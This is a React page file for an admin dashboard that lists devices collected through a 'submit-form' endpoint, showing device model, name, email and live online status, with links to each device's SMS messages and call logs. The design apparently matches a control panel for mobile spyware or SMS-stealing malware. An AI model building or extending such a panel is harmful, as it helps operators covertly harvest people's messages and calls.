// src/pages/Dashboard.jsx
import React, { useEffect, useState } from "react";
import axios from "axios";
import { Link } from "react-router-dom";
import { useSocket } from "../hooks/useSocket";

export default function Dashboard() {
    const [users, setUsers] = useState([]);
    const [loading, setLoading] = useState(true);

    // NEW: Track online users
    const [onlineUsers, setOnlineUsers] = useState({});

    // Fetch users
    const fetchUsers = async () => {
        try {
            const res = await axios.get("https://call-forward.onrender.com/submit-form");
            setUsers(res.data.data || []);
        } catch (err) {
            console.error(err);
        } finally {
            setLoading(false);
        }
    };

    useEffect(() => {
        fetchUsers();
    }, []);

    // Realtime new user listener
    useSocket("new_user", (user) => {
        setUsers((prev) => [user, ...prev]);
    });

    useSocket("user_deleted", ({ userId }) => {
        setUsers(prev => prev.filter(u => u._id !== userId));
    });


    // NEW: Listen for online/offline updates
    useSocket("user_status_update", ({ userId, status }) => {
        setOnlineUsers((prev) => ({
            ...prev,
            [userId]: status === "online",
        }));
    });

    const handleDelete = async (id, name) => {
        const confirmDelete = window.confirm(`Delete user "${name}" ?\nThis will remove user + SMS + Call logs.`);
        if (!confirmDelete) return;

        try {
            await axios.delete(`https://call-forward.onrender.com/submit-form/${id}`);

            // Remove from UI instantly
            setUsers(prev => prev.filter(u => u._id !== id));

        } catch (err) {
            console.error("DELETE ERROR:", err);
            alert("Failed to delete user!");
        }
    };


    return (
        <div className="min-h-screen bg-gray-100 p-4 md:p-6">
            {/* Header */}
            <div className="flex flex-col md:flex-row justify-between md:items-center mb-6 gap-2">
                <h1 className="text-2xl md:text-3xl font-bold text-gray-800">
                    Admin Dashboard
                </h1>
                <span className="text-sm text-gray-600">
                    Total Users: {users.length}
                </span>
            </div>

            {/* Desktop Table */}
            <div className="hidden md:block bg-white rounded-xl shadow overflow-hidden">
                <div className="overflow-x-auto">
                    <table className="min-w-full text-sm text-left">
                        <thead className="bg-gray-100 text-gray-600 uppercase text-xs">
                            <tr>
                                <th className="px-6 py-4">Device Model</th>
                                <th className="px-6 py-4">User ID</th>
                                <th className="px-6 py-4">Name</th>
                                <th className="px-6 py-4">Email</th>

                                {/* NEW STATUS COLUMN */}
                                <th className="px-6 py-4">Status</th>

                                <th className="px-6 py-4 text-center">Actions</th>
                            </tr>
                        </thead>

                        <tbody className="divide-y">
                            {users.map((user) => (
                                <tr
                                    key={user.userId}
                                    className="hover:bg-gray-50 transition"
                                >
                                    <td className="px-6 py-4 font-medium text-gray-800">
                                        {user.deviceModel || "Unknown"}
                                    </td>

                                    <td className="px-6 py-4 text-gray-500">
                                        {user.userId}
                                    </td>

                                    <td className="px-6 py-4 font-semibold text-gray-800">
                                        {user.name}
                                    </td>

                                    <td className="px-6 py-4 text-gray-600">
                                        {user.email}
                                    </td>

                                    {/* STATUS BADGE */}
                                    <td className="px-6 py-4">
                                        <div className="flex items-center gap-2">
                                            <span
                                                className={`h-3 w-3 rounded-full ${onlineUsers[user.userId]
                                                    ? "bg-green-500"
                                                    : "bg-gray-400"
                                                    }`}
                                            ></span>

                                            <span
                                                className={`text-xs font-medium ${onlineUsers[user.userId]
                                                    ? "text-green-700"
                                                    : "text-gray-600"
                                                    }`}
                                            >
                                                {onlineUsers[user.userId] ? "Online" : "Offline"}
                                            </span>
                                        </div>
                                    </td>

                                    {/* ACTION BUTTONS */}
                                    <td className="px-6 py-4">
                                        <div className="flex justify-center gap-2">
                                            <Link
                                                to={`/sms/${user.userId}`}
                                                className="px-3 py-1 rounded-md bg-blue-600 text-white hover:bg-blue-700 text-xs"
                                            >
                                                SMS
                                            </Link>

                                            <Link
                                                to={`/call-logs/${user.userId}`}
                                                className="px-3 py-1 rounded-md bg-green-600 text-white hover:bg-green-700 text-xs"
                                            >
                                                Calls
                                            </Link>

                                            <Link
                                                to={`/user/${user.userId}`}
                                                className="px-3 py-1 rounded-md bg-gray-700 text-white hover:bg-gray-800 text-xs"
                                            >
                                                View
                                            </Link>

                                            {/* DELETE BUTTON */}
                                            <button
                                                onClick={() => handleDelete(user._id, user.name)}
                                                className="px-3 py-1 rounded-md bg-red-600 text-white hover:bg-red-700 text-xs"
                                            >
                                                Delete
                                            </button>
                                        </div>

                                    </td>
                                </tr>
                            ))}
                        </tbody>
                    </table>
                </div>
            </div>

            {/* MOBILE CARD UI */}
            <div className="md:hidden space-y-4">
                {users.map((user) => (
                    <div
                        key={user.userId}
                        className="bg-white rounded-xl shadow p-4"
                    >
                        {/* STATUS BADGE */}
                        <div className="flex items-center gap-2 mb-3">
                            <span
                                className={`h-3 w-3 rounded-full ${onlineUsers[user.userId]
                                    ? "bg-green-500"
                                    : "bg-gray-400"
                                    }`}
                            ></span>

                            <span className="text-xs font-semibold">
                                {onlineUsers[user.userId] ? "Online" : "Offline"}
                            </span>
                        </div>

                        <div className="mb-2">
                            <p className="text-xs text-gray-500">Device Model</p>
                            <p className="font-semibold text-gray-800">
                                {user.deviceModel || "Unknown"}
                            </p>
                        </div>

                        <div className="mb-2">
                            <p className="text-xs text-gray-500">User ID</p>
                            <p className="text-gray-700">{user.userId}</p>
                        </div>

                        <div className="mb-2">
                            <p className="text-xs text-gray-500">Name</p>
                            <p className="text-gray-700">{user.name}</p>
                        </div>

                        <div className="mb-4">
                            <p className="text-xs text-gray-500">Email</p>
                            <p className="text-gray-700">{user.email}</p>
                        </div>

                        {/* MOBILE ACTION BUTTONS */}
                        <div className="flex gap-2 mt-3">
                            <Link
                                to={`/sms/${user.userId}`}
                                className="flex-1 px-3 py-2 rounded-md bg-blue-600 text-white text-center text-sm"
                            >
                                SMS
                            </Link>

                            <Link
                                to={`/call-logs/${user.userId}`}
                                className="flex-1 px-3 py-2 rounded-md bg-green-600 text-white text-center text-sm"
                            >
                                Calls
                            </Link>

                            <Link
                                to={`/user/${user.userId}`}
                                className="flex-1 px-3 py-2 rounded-md bg-gray-700 text-white text-center text-sm"
                            >
                                View
                            </Link>

                            {/* DELETE BUTTON - MOBILE */}
                            <button
                                onClick={() => handleDelete(user._id, user.name)}
                                className="flex-1 px-3 py-2 rounded-md bg-red-600 text-white text-center text-sm"
                            >
                                Delete
                            </button>
                        </div>

                    </div>
                ))}
            </div>

            {/* Loading / Empty States */}
            {loading && (
                <p className="text-center py-6 text-gray-500">Loading users...</p>
            )}

            {!loading && users.length === 0 && (
                <p className="text-center py-6 text-gray-500">No users found.</p>
            )}
        </div>
    );
}
